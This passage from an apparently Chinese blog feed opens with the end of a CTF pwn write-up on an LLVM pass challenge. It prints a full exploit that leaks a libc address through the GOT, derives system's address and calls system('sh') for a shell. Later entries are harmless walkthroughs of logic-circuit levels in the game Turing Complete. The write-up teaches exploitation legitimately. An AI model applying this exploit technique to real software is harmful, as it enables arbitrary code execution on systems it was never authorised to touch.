_ZN4edoc4saveEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op7</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">// regs[idx] = *(regs[6]+num)</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4loadEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"><span class="comment">// op8</span></span><br><span class="line"><span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line"><span class="comment">//*(regs[6]+num)(regs[idx])   //break</span></span><br><span class="line"><span class="type">void</span> _ZN4edoc4runcEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>num&amp;7&#x3D;&#x3D;0意味着低三位为0。regs[6]&amp;0xfff=&#x3D;0意味着低1.5个字节要为0。op8这个函数指针太显眼了。接下来该思考如果getshell了。</p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>如果不出意外，最后肯定要利用op8构造一个<code>system(&quot;/bin/sh&quot;)</code>。那么我们就需要想办法使*(regs[6])存system的真实地址（或者附近），但是这个regs[6]不是我们能够直接操控的。唯一能看到一点希望的是op5，因为他可以通过交换数据间接控制regs[6]和regs[7]。</p><p>opt的got表可读可写，我们考虑从got入手泄露出libc地址。显然op7可以很容易做到这一点，然后再考虑利用运算得到system地址。先用IDA打开opt看一眼got表，我们需要找到一个已经解析过地址的函数，0x442068处的<code>__cxa_atexit</code>函数就很显眼。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// op1 regs[0]=memcpy@got</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442050</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先调试一下看是否成功写进去，然后发现竟然没进到vmRun，打开exp.ll文件一看，llvm帮我把函数名给改了……那就使用extern “C”避开c++的优化，这下可以了。其他声明也是同理。（吐槽，c++的函数名太长了动调看得是真的难受啊）</p><p>动调发现这个regs数组实际是在堆上的。并且regs[6]和regs[7]一开始就不为0，里面存了类似mmap出来的一块地址的始末地址，神奇的是他位于ld模块中间。估计是在init的时候写入的。<img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-mmap%E5%A7%8B%E6%9C%AB%E5%9C%B0%E5%9D%80.png" alt="yl-mmap始末地址"><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-mmap%E5%A7%8B%E6%9C%AB%E5%9C%B0%E5%9D%80%E5%87%BA%E5%A4%84.png" alt="yl-mmap始末地址出处"></p><p>下面我们考虑上约束条件，尝试将<code>__cxa_atexit</code>的libc地址泄露出来。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[6]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68+0x1000</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x443000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[7]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op7 regs[0] = *(regs[6]+0x68)</span></span><br><span class="line">    _ZN4edoc4loadEhj(op, <span class="number">0</span>, <span class="number">0x68</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-%E5%86%99%E5%85%A5cxa_atexit%E5%9C%B0%E5%9D%80.png" alt="yl-写入cxa_atexit地址"></p><p>可以看到成功了。接着考虑构造system地址。system在libc中的偏移是0x50D70，__cxa_atexit是0x458C0。利用位移和加法构造system，最后将system地址放到mmap的地址上执行即可。所以一开始我们还需要把mmap的地址保存下来。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// op1</span></span><br><span class="line">    <span class="comment">// idx&lt;=5</span></span><br><span class="line">    <span class="comment">// regs[idx]=num1+num2</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4addiEhii(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num1, <span class="type">int</span> num2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op2</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; -0x1000&lt;num&lt;0x1000 &amp;&amp; isUsed[0]==0</span></span><br><span class="line">    <span class="comment">// use_once</span></span><br><span class="line">    <span class="comment">// regs[idx]+=num</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4chgrEhi(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op3</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; offset&lt;0x40</span></span><br><span class="line">    <span class="comment">// choice==0: regs[idx]&gt;&gt;=offset</span></span><br><span class="line">    <span class="comment">// choice==1: regs[idx]&lt;&lt;=offset</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4sftrEhbh(edoc *op, <span class="type">int8_t</span> idx, <span class="type">bool</span> choice, <span class="type">int8_t</span> offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op4</span></span><br><span class="line">    <span class="comment">// idx1&lt;=5 &amp;&amp; idx2&lt;=5 &amp;&amp; idx3&lt;=5</span></span><br><span class="line">    <span class="comment">// regs[idx1] = regs[idx3] | regs[idx2]</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4borrEhhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2, <span class="type">int8_t</span> idx3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op5</span></span><br><span class="line">    <span class="comment">// idx1&lt;8 &amp;&amp; idx2&lt;8</span></span><br><span class="line">    <span class="comment">// regs[idx1] = regs[idx2]</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4movrEhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op6</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">//*(regs[6]+num) = regs[idx]  //?</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4saveEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op7</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">// regs[idx] = *(regs[6]+num)</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4loadEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op8</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">//*(regs[6]+num)(regs[idx])   //break</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4runcEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// 保存mmap地址</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[6]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68+0x1000</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x443000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[7]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op7 regs[0] = *(regs[6]+0x68) 泄露libc</span></span><br><span class="line">    _ZN4edoc4loadEhj(op, <span class="number">0</span>, <span class="number">0x68</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op5 regs[1]=regs[0] 备份高位</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&lt;&lt;=44  清空高位，只留0x458C0</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">1</span>, <span class="number">44</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&gt;&gt;=44  清空高位，只留0x458C0</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">44</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&gt;&gt;=12  将0x458C0中的0x45移动到低位</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="comment">// op2 regs[0]+=0xd  将0x458C0中的0x45变成0x50D70中的0x50</span></span><br><span class="line">    _ZN4edoc4chgrEhi(op, <span class="number">0</span>, <span class="number">0xd</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&lt;&lt;=12  恢复原位</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="comment">// op1 regs[3]=0xd70</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">3</span>, <span class="number">0xd70</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[3] | regs[0] 合并地址</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op3 regs[1]&gt;&gt;=20  清空低位，只留libc基址的高位部分</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="comment">// op3 regs[1]&lt;&lt;=20  清空低位，只留libc基址的高位部分</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">1</span>, <span class="number">1</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[0] | regs[1] 合并地址</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还原mmap地址</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">4</span>);</span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// op6 *(regs[6]+0) = regs[0]  &amp;system</span></span><br><span class="line">    _ZN4edoc4saveEhj(op, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op1 regs[3]=26739   &quot;sh&quot;</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">3</span>, <span class="number">26739</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=8</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[0] | regs[4]  regs[6]+8</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// op6 *(regs[6]+8) = &quot;sh&quot;</span></span><br><span class="line">    _ZN4edoc4saveEhj(op, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op8 诸神黄昏</span></span><br><span class="line">    _ZN4edoc4runcEhj(op, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-getshell.png" alt="yl-getshell"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>我好困，睡了。再见，花了我三个钟的恶心人的题目。</p>]]></content>
      
      
      <categories>
          
          <category> llvm pass </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> WP </tag>
            
            <tag> llvm </tag>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『图灵完备』完全攻略之处理器架构（四）</title>
      <link href="/2024/Turing-Complete-4/"/>
      <url>/2024/Turing-Complete-4/</url>
      
        <content type="html"><![CDATA[<h2 id="OVERTURE架构"><a href="#OVERTURE架构" class="headerlink" title="OVERTURE架构"></a>OVERTURE架构</h2><p><img src="https://c-lby.top/images/Turing-Complete/4/%E5%9B%BE%E7%81%B5%E5%AE%8C%E5%A4%87.png" alt="图灵完备"></p><h3 id="指令解码器"><a href="#指令解码器" class="headerlink" title="指令解码器"></a>指令解码器</h3><p>位于架构上方</p><p><img src="https://c-lby.top/images/Turing-Complete/4/DEC.png" alt="DEC"></p><h3 id="条件跳转"><a href="#条件跳转" class="headerlink" title="条件跳转"></a>条件跳转</h3><p>架构左下角</p><p><img src="https://c-lby.top/images/Turing-Complete/4/COND.png" alt="COND"></p><h3 id="算数引擎"><a href="#算数引擎" class="headerlink" title="算数引擎"></a>算数引擎</h3><p>ALU，位于架构右上角</p><p><img src="https://c-lby.top/images/Turing-Complete/4/ALU.png" alt="ALU"></p>]]></content>
      
      
      <categories>
          
          <category> 图灵完备 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图灵完备 </tag>
            
            <tag> 计组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『图灵完备』完全攻略之存储器（三）</title>
      <link href="/2024/Turing-Complete-3/"/>
      <url>/2024/Turing-Complete-3/</url>
      
        <content type="html"><![CDATA[<h2 id="循环依赖"><a href="#循环依赖" class="headerlink" title="循环依赖"></a>循环依赖</h2><p>要你搭建一个输出决定输入的错误电路。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%BE%AA%E7%8E%AF%E4%BE%9D%E8%B5%96.png" alt="循环依赖"></p><h2 id="延迟线"><a href="#延迟线" class="headerlink" title="延迟线"></a>延迟线</h2><p>延迟线元件的体验关卡，根据预期输出可以看到输入延迟了两刻才输出。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%BB%B6%E8%BF%9F%E7%BA%BF.png" alt="延迟线"></p><h2 id="奇变偶不变"><a href="#奇变偶不变" class="headerlink" title="奇变偶不变"></a>奇变偶不变</h2><p>关卡告诉我们在延迟的情况下，输出是可以决定输入的。本关卡需要在偶数刻输出高电平，我们利用异或和延迟输出可以做到这一点。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%A5%87%E5%8F%98%E5%81%B6%E4%B8%8D%E5%8F%98.png" alt="奇变偶不变"></p><p>手册解锁了“循环依赖白名单”词条，讲了三种锁存器的实现是不受循环依赖的限制的。</p><h2 id="1位取反器"><a href="#1位取反器" class="headerlink" title="1位取反器"></a>1位取反器</h2><p>根据反转位决定是否需要对输入进行取反后输出。观察真值表可以发现性质和异或门完全一样。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/1%E4%BD%8D%E5%8F%96%E5%8F%8D%E5%99%A8.png" alt="1位取反器"></p><h2 id="1位开关"><a href="#1位开关" class="headerlink" title="1位开关"></a>1位开关</h2><p>用2个开关和2个非门搭建一个异或门。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/1%E4%BD%8D%E5%BC%80%E5%85%B3.png" alt="1位开关"></p><h2 id="数据选择器"><a href="#数据选择器" class="headerlink" title="数据选择器"></a>数据选择器</h2><p>根据选通输入选择一个输入端发送给输出，利用开关和非门就能完成这个电路</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E6%95%B0%E6%8D%AE%E9%80%89%E6%8B%A9%E5%99%A8.png" alt="数据选择器"></p><h2 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h2><p>我们可以先布置好每个输入到每个输出的线路，然后再通过布置开关来控制某条线路是否允许通过即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E6%80%BB%E7%BA%BF1.png" alt="总线1"></p><p>但是显然这样子不够优雅，并且也没有体现标题总线。我们知道在一次发送中一定只有一个输入一个输出，因此我们只需要一条线进行数据传输，其他端口都接入这条总线即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E6%80%BB%E7%BA%BF2.png" alt="总线2"></p><h2 id="优雅存储"><a href="#优雅存储" class="headerlink" title="优雅存储"></a>优雅存储</h2><p>这关其实不难想。延迟线的作用是延迟一刻输出，并且延迟后的输出可以给到输入，那么储存一个数，我们是否可以理解为一直输出这个数，延迟无数刻。那么我只要把延迟后的输出再传入到延迟之前的电路，那我就可以一直输出同一个数字了。那我们要更新数字的时候怎么办呢？只要切断延迟输出回到输入这条路，切换成待写入的值给延迟线即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E4%BC%98%E9%9B%85%E5%AD%98%E5%82%A8.png" alt="优雅存储"></p><h2 id="存储一字节"><a href="#存储一字节" class="headerlink" title="存储一字节"></a>存储一字节</h2><p>利用1位存储器搭建8位存储器</p><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%AD%98%E5%82%A8%E4%B8%80%E5%AD%97%E8%8A%82.png" alt="存储一字节"></p><h2 id="小盒子"><a href="#小盒子" class="headerlink" title="小盒子"></a>小盒子</h2><p><img src="https://c-lby.top/images/Turing-Complete/3/%E5%B0%8F%E7%9B%92%E5%AD%90.png" alt="小盒子"></p><h2 id="计数器"><a href="#计数器" class="headerlink" title="计数器"></a>计数器</h2><p><img src="https://c-lby.top/images/Turing-Complete/3/%E8%AE%A1%E6%95%B0%E5%99%A8.png" alt="计数器"></p>]]></content>
      
      
      <categories>
          
          <category> 图灵完备 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图灵完备 </tag>
            
            <tag> 计组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『图灵完备』完全攻略之算数运算（二）</title>
      <link href="/2024/Turing-Complete-2/"/>
      <url>/2024/Turing-Complete-2/</url>
      
        <content type="html"><![CDATA[<h2 id="二进制速算"><a href="#二进制速算" class="headerlink" title="二进制速算"></a>二进制速算</h2><p>口算题，不涉及电路，好好熟悉一下2的次方数再去做会比较快。</p><h2 id="成对的麻烦"><a href="#成对的麻烦" class="headerlink" title="成对的麻烦"></a>成对的麻烦</h2><p>有两个及以上数量的真才为真，一共有四个输入。思路很简单，我只要保证每两个输入至少会接在同一个与门上即可，四个输入组合起来一共有六个可能，也就是会有六个与门，这些与门再由或门连接即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E6%88%90%E5%AF%B9%E7%9A%84%E9%BA%BB%E7%83%A6.png" alt="成对的麻烦"></p><h2 id="奇数个信号"><a href="#奇数个信号" class="headerlink" title="奇数个信号"></a>奇数个信号</h2><p>奇数个真才为真，并且限制只能用三个元件。我在上高中的时候从数学老师那里学到印象最深的一个道理是，<strong>正难则反</strong>。这道题换个视角来看就是，偶数个真就是假。诶！异或门不就刚好是这个性质吗？所以这道题只需要两两输入接入一个异或门，再由一个异或门连接即可。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E5%A5%87%E6%95%B0%E4%B8%AA%E4%BF%A1%E5%8F%B7.png" alt="奇数个信号"></p><h2 id="信号计数"><a href="#信号计数" class="headerlink" title="信号计数"></a>信号计数</h2><p>根据输入为真的数量输出二进制（3bits）。</p><p>关于1的思路很简单，因为只有当数字是奇数的时候才会为真。观察真值表可以发现，当奇数个真的时候，输出一定是奇数，所以接入输出一的电路和“奇数个信号”电路是一样的。</p><p>关于2我们也能找到一些规律，当至多只有一个真的时候，数字不会大于1，所以2肯定不会启用，也就是说当输入为真数量大于等于2的时候输出真，那么电路就和“成对的麻烦”一样了。但是问题是当输入全部为真的时候，2并不会启用，只有4启用。这个问题很好解决，给输出二接一个异或门就行，用与门判断如果全部都为真，将这个结果与上述电路接入异或门给到输出二即可。</p><p>其实这道题没有这么难，主要看你能不能关联到前面做的电路。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E4%BF%A1%E5%8F%B7%E8%AE%A1%E6%95%B0.png" alt="信号计数"></p><h2 id="加倍"><a href="#加倍" class="headerlink" title="加倍"></a>加倍</h2><p>新的元件。非常简单，每一个都乘二后输出，其实也就是左移了一位。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E5%8A%A0%E5%80%8D.png" alt="加倍"></p><h2 id="8位非"><a href="#8位非" class="headerlink" title="8位非"></a>8位非</h2><p>8位数分别取反即可</p><p><img src="https://c-lby.top/images/Turing-Complete/2/8%E4%BD%8D%E9%9D%9E.png" alt="8位非"></p><h2 id="8位或"><a href="#8位或" class="headerlink" title="8位或"></a>8位或</h2><p>8位数分别取或即可</p><p><img src="https://c-lby.top/images/Turing-Complete/2/8%E4%BD%8D%E6%88%96.png" alt="8位或"></p><h2 id="半加器"><a href="#半加器" class="headerlink" title="半加器"></a>半加器</h2><p>加法，但是两个单字节相加，输出也只有一个字节，没法完全储存所有可能的结果（因为可能进位溢出），但是也预留了进位寄存器一个字节。这道题可以根据真值表来做，sum位其实就是异或门的真值表，car位就是与门的真值表。</p><h2 id="全加器"><a href="#全加器" class="headerlink" title="全加器"></a>全加器</h2><p>思路和半加器稍微有点不同，没法直接通过真值表来做，可以从算术的角度去考虑。只有三个输入的情况下，输出只有0,1,2,3。只有2和3的时候才会产生进位，所以利用“成对的麻烦”相同的思路去判断输入为真的数量有没有超过2个即可。而sum位则可以使用“奇数个信号”电路的思路来编写。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E5%85%A8%E5%8A%A0%E5%99%A8.png" alt="全加器"></p><h2 id="8位加法器"><a href="#8位加法器" class="headerlink" title="8位加法器"></a>8位加法器</h2><p>这时候已经有add元件可以用了，那就很简单了，对应位分别相加即可，别忘了在计算高一位的时候要考虑上低一位的进位问题。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/8%E4%BD%8D%E5%8A%A0%E6%B3%95%E5%99%A8.png" alt="8位加法器"></p><p>（彩虹！（神金））</p><h2 id="负数"><a href="#负数" class="headerlink" title="负数"></a>负数</h2><p>先学好补码的知识，再来做口算题。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E8%A1%A5%E7%A0%81.png" alt="补码"></p><h2 id="相反数"><a href="#相反数" class="headerlink" title="相反数"></a>相反数</h2><p>前面已经学过了补码和负数的知识了，那么其实就很容易想到某个数的相反数其实就是那个数取反后+1。如果这关想不懂，说明补码没学懂。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/%E7%9B%B8%E5%8F%8D%E6%95%B0.png" alt="相反数"></p><h2 id="1位解码器"><a href="#1位解码器" class="headerlink" title="1位解码器"></a>1位解码器</h2><p>一个神奇的元件，由一个元件控制到不同输出。因为有了开关元件，所以这题不是很难，当一路控制为开路的时候另一路控制为闭路即可，一个输入分为两条路，其中一条路要加上非门，这样来保证一条开路一条闭路。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/1%E4%BD%8D%E8%A7%A3%E7%A0%81%E5%99%A8.png" alt="1位解码器"></p><h2 id="3位解码器"><a href="#3位解码器" class="headerlink" title="3位解码器"></a>3位解码器</h2><p>3位输入排列后可以得到8种可能，这时候用开关就不好用了。我选择用排列组合的方式，用与门，将八种情况全部列出来。对于一位输入，分两条路之后，无非就是1和0的区别。根据真值表来选择节点。</p><p><img src="https://c-lby.top/images/Turing-Complete/2/3%E4%BD%8D%E8%A7%A3%E7%A0%81%E5%99%A8.png" alt="3位解码器"></p><h2 id="逻辑引擎"><a href="#逻辑引擎" 